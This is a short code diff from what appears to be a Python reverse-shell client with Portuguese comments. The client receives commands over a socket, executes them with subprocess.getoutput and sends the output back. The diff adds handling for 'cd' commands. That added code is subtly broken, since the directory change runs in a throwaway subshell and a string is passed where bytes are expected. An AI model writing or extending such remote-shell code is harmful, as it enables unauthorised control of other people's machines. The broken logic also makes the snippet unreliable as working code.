@@ -20,6 +20,10 @@ while True:
     command = s.recv(BUFFER_SIZE).decode()
     if command.lower() == "exit":
         break
+    if command.lower().startswith("cd"):
+        subprocess.getoutput(command)
+        output = subprocess.getoutput("cd")
+        s.send(output)
     # Executar o comando
     output = subprocess.getoutput(command)
     # Enviar o resultado
